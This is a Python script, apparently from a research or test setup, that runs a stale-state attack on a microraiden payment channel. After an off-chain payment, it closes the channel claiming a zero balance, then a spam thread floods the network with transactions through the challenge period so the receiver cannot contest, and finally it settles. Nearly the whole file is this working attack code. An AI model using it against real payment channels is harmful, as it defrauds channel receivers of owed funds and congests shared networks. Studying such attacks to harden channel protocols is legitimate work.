import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '../..'))

from microraiden import Client
from microraiden.utils import privkey_to_addr
from utils import (
    send_payment,
    create_close_channel_transaction,
    create_settle_channel_transaction,
    create_spam_transactions,
    wait_for_blocks,
    wait_for_open,
    wait_for_close,
    wait_for_settle,
)
import config as config
from web3 import Web3, HTTPProvider
from threading import Thread, currentThread
import logging, click, json, time

def spammer(web3, private_key: str = config.PRIVATE_KEY, nonce_offset: int = 0, target_block: int = 0, batch_size: int = config.SPAM_BATCH_SIZE, min_pending_txs: int = config.MIN_PENDING_TXS, callback = None):
    thread_log = logging.getLogger('spammer')

    t = currentThread()

    account_address = privkey_to_addr(private_key)
    first_nonce = web3.eth.getTransactionCount(account_address, 'pending') + nonce_offset
    sent_txs = 0
    current_block = web3.eth.blockNumber

    while getattr(t, 'do_run', True) & (current_block < target_block):        
        spam_txs = create_spam_transactions(
            private_key=private_key,
            web3=web3,
            account_address=account_address,
            number=batch_size,
            min_nonce=first_nonce+sent_txs,
        )
        thread_log.debug('Sending {} spam transactions...'.format(len(spam_txs)))
        
        for tx in spam_txs:
            web3.eth.sendRawTransaction(tx)
            sent_txs += 1
        
        thread_log.info('Sent transactions = {}'.format(sent_txs))
        
        while getattr(t, 'do_run', True) & (web3.eth.getTransactionCount(account_address, 'pending') < (first_nonce + sent_txs - min_pending_txs)) & (web3.eth.blockNumber < target_block):
            thread_log.info((first_nonce + sent_txs) - web3.eth.getTransactionCount(account_address, 'pending'))
            time.sleep(1)

        current_block = web3.eth.blockNumber
        thread_log.info('Current block = {} / Target block = {}'.format(current_block, target_block))
        
    if getattr(t, 'do_run', True) & (callback is not None):
        callback(first_nonce+sent_txs)

# def spammer2(web3, private_key: str = config.PRIVATE_KEY, number_txs: int = config.NUMBER_SPAM_TX, batch_size: int = config.SPAM_BATCH_SIZE, callback = None):
#     thread_log = logging.getLogger('spammer')

#     t = currentThread()
#     sent_txs = 0
    
#     account_address = privkey_to_addr(private_key)
#     first_nonce = web3.eth.getTransactionCount(account_address, 'pending')

#     while getattr(t, 'do_run', True) & (sent_txs < number_txs):
#         number = batch_size
#         if (number_txs - sent_txs) < batch_size:
#             number = number_txs - sent_txs
        
#         spam_txs = create_spam_transactions(private_key=private_key, web3=web3, account_address=account_address, number=number, min_nonce=first_nonce+sent_txs)
#         thread_log.debug('Sending {} spam transactions...'.format(len(spam_txs)))
        
#         for tx in spam_txs:
#             web3.eth.sendRawTransaction(tx)
        
#         sent_txs += len(spam_txs)
#         thread_log.info('Sent transactions = {}'.format(sent_txs))
    
#     if callback is not None:
#         callback()

def cheat_and_spam(channel, private_key: str = config.PRIVATE_KEY, challenge_period: int = config.CHALLENGE_PERIOD, batch_size: int = config.SPAM_BATCH_SIZE):
    '''
    Performs a stale state attack on the given channel. 
    Assumes that the given channel's balance is > 0. Closes the channel with balance 0 
    and spams the network with the given number {number_txs} of transactions from 
    the account with the given {private_key}.
    '''
    # Create close channel transaction
    close_tx = create_close_channel_transaction(channel=channel, balance=0)

    # Create given number of signed spam transactions
    # spam_txs = create_spam_transactions(private_key=private_key, web3=channel.core.web3, account_address=privkey_to_addr(private_key), nonce_offset=1, number=batch_size)

    # Send close channel transaction    
    logging.info('Sending close transaction...')
    channel.core.web3.eth.sendRawTransaction(close_tx)

    logging.info('Starting network spamming for {} blocks...'.format(challenge_period))
    spam_thread = Thread(target=spammer, args=(channel.core.web3, private_key, 1, channel.core.web3.eth.blockNumber+challenge_period, batch_size, config.MIN_PENDING_TXS, lambda nonce: send_settle(channel, nonce),))
    spam_thread.start()

    # Wait for channel to be closed
    closed_event = wait_for_close(channel)
    logging.info('Channel closed at block #{}'.format(closed_event['blockNumber']))

    # Send spam transactions
    # logging.info('Sending {} spam transactions...'.format(len(spam_txs)))
    # for tx in spam_txs:
    #     print(tx)
    #     channel.core.web3.eth.sendRawTransaction(tx)
    
    # Wait for channel to be settled
    settled_event = wait_for_settle(channel)
    logging.info('Channel settled at block #{}'.format(settled_event['blockNumber']))

    spam_thread.do_run = False
    spam_thread.join()

    settle_tx_hash = settled_event['transactionHash']
    settle_tx = channel.core.web3.eth.getTransaction(settle_tx_hash)

    # Print result
    print()
    print('-----------------------------------------------------------')
    print('Sender \t\t {}'.format(channel.core.address))
    print('Receiver \t {}'.format(channel.receiver))
    print()
    print('OPENED block \t #{}'.format(channel.block))
    print('CLOSED block \t #{}'.format(closed_event['blockNumber']))
    print('SETTLED block \t #{}'.format(settled_event['blockNumber']))
    print()
    # print('Spam transactions \t {}'.format(number_txs))
    print('Settled by \t {}'.format(settle_tx['from']))
    print('CLOSE->SETTLE \t {}'.format(settled_event['blockNumber']-closed_event['blockNumber']))
    print('-----------------------------------------------------------')
    print()

def send_settle(channel, nonce):
    settle_tx = create_settle_channel_transaction(channel, nonce)
    channel.core.web3.eth.sendRawTransaction(settle_tx)
    logging.info('Sent settle transaction')

@click.command()
@click.option(
    '--rpcport',
    default=8545,
    help='Port of the RPC server',
    type=int
)
def main(rpcport: int):
    # Initialize web3
    web3 = Web3(HTTPProvider('http://127.0.0.1:' + str(rpcport)))

    # Initialize client
    client = Client(private_key=config.PRIVATE_KEY, key_password_path=None, channel_manager_address=config.CHANNEL_MANAGER_ADDRESS)

    # Get an open channel
    channel = client.get_suitable_channel(receiver=web3.toChecksumAddress(config.RECEIVER_ADDRESS), value=1)

    # Wait for channel to be open
    opened_event = wait_for_open(channel=channel, confirmations=2)
    logging.info('Active channel: (sender={}, block={})'.format(channel.sender, channel.block))

    # Send an off-chain payment
    amount = 1
    channel.create_transfer(amount)
    send_payment(channel=channel, amount=amount)

    # Start stale state attack
    cheat_and_spam(channel=channel, private_key=config.PRIVATE_KEY, challenge_period=config.CHALLENGE_PERIOD, batch_size=config.SPAM_BATCH_SIZE)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    main()
